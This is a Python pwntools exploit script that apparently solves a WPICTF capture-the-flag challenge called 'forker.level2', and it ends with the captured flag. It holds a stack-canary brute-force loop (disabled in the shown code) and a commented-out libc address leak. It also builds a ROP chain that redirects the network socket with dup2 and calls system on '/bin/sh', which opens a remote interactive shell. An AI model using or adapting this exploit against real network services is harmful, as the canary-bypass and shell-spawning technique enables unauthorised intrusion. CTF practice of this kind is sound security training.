from pwn import *
import sys, time

### Config ###
filename = './forker.level2'
rhost = "forker2.wpictf.xyz"
rport = 31337

### Binary ###
context.binary = filename
binary = ELF(filename)

### Context ###
#context.arch=elf.arch
context.log_level='INFO' # ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']

### Def function area ###


### Start exploit ###
if len(sys.argv) == 1:
    rhost = "localhost"
    p = remote("localhost", rport)
else:
    p = remote(rhost,rport)

canary = ''
saved_canary = '00ef9a8ee078'.decode("hex")

while False:
    for i in xrange(2):
        for byte in xrange(0x100):
            if byte == 0x0a:
                continue
            canary = saved_canary + p8(byte)
            p.recvuntil("Password:")
            payload = "A" * 72
            payload += canary
            p.sendline(payload)
            try:
                res = p.recv()
                if "You failed to get a correct password!" in res:
                    log.info("found : " + hex(byte))
                    saved_canary += p8(byte)
                    p.close()
                    p = remote(rhost, rport)
                    break
            except:
                canary = saved_canary
                log.info("fail canary : " + saved_canary)
                p.close()
                p = remote(rhost, rport)
    break

#log.info(saved_canary.encode("hex"))

pop1rdi = 0x0000000000400bc3        # : pop rdi; ret;
pop2rsi = 0x0000000000400bc1        # : pop rsi; pop r15; ret;
ret = 0x0000000000400B54
dprintf = 0x4007a0
puts_got = 0x602018
fork_got = 0x0000000000602070

#local_canary = "003b6276d24ff198".decode("hex")        # local
local_canary = "00cd14d5283717a9".decode("hex")     # remote

# leak 
'''
payload = "A" * 72 + local_canary + p64(ret) * 8
payload += p64(pop1rdi) + p64(4)
payload += p64(pop2rsi) + p64(puts_got) * 2
payload += p64(dprintf)
p.recvuntil("Password:")
p.sendline(payload)

leak = u64(p.recv(6).ljust(8, "\x00"))
'''
leak = 0x7f95e083f460
libc_base = leak - 0x78460
system = libc_base + 0x47dc0
dup2 = libc_base + 0x1048e0
binsh = libc_base + 0x1a3f20

# exploit

buf = "A" * 72 + local_canary + p64(ret) * 8
buf += p64(pop1rdi) + p64(4)
buf += p64(pop2rsi) + p64(0) * 2
buf += p64(dup2)
buf += p64(pop1rdi) + p64(4)
buf += p64(pop2rsi) + p64(1) * 2
buf += p64(dup2)
buf += p64(pop1rdi) + p64(binsh) + p64(system)
p.sendline(buf)

p.interactive()
# WPI{Thats why you dont fork and expect canaries to work}
